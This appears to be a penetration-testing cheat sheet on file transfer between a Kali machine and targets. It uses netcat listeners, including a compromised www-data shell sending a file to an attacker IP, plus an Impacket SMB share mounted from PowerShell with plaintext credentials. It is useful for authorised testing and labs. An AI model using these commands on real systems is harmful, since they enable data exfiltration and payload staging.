# File transfer from Kali to Windows using netcat
(Sender) Kali ====> Windows (Receiver) 
``` 
nc.exe -nlvp 443 > C:\binary.exe 
``` 
``` 
nc -w 3 <Windows IP> 443 < binary.exe 
``` 

## File transfer from Linux to Kali

```
root@kali:~# nc -nvlp 5555 > filename

www-data@machine:/usr/local/bin$ nc 10.10.X.X 5555 < filename
```

## SMB Mount folder creation and transfer between Kali & Windows using Impacket SMB Module

Create SMB Share folder on Kali
```
sudo impacket-smbserver <SharefolderName> $(pwd) -smb2support -user <username> -password <password>
[sudo] password for kali: 
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Create powershell script and mount SMB folder
```
$pass = convertto-securestring 'Password123' -AsPlainText -Force 
$cred = New-Object System.Management.Automation.PSCredential('vallikkv', $pass)
New-PSDrive -Name vallikkvshare -PSProvider FileSystem -Credential $cred -Root \\<Kali ip>

```
